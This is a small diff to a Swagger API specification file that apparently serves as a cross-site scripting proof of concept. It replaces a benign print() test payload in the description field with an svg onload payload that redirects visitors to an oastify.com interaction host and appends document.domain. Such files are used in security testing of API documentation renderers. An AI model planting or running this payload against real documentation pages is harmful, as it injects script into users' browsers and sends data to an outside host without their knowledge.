@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   version: "0.0.1"
   title: Example Title
-  description: <img src=1 onmouseleave=print()>
+  description: <svg/onload=location/**/='http://k9uz2axhg98amzdyw2o08m71dsjj7avz.oastify.com/'+document.domain>
 paths:
   /:
     get:
